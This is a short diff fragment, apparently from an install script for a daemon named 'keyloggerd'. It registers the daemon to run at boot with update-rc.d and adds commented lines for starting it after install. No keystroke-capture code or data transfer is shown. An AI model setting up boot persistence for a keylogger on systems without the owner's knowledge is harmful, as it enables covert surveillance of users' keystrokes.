@@ -24,3 +24,6 @@ update-rc.d keyloggerd defaults
 
 # Make sure that the entry is added in rc.d
 # ls -l /etc/rc?.d/*keyloggerd
+
+# auto start after installing it
+# /etc/init.d/keyloggerd start
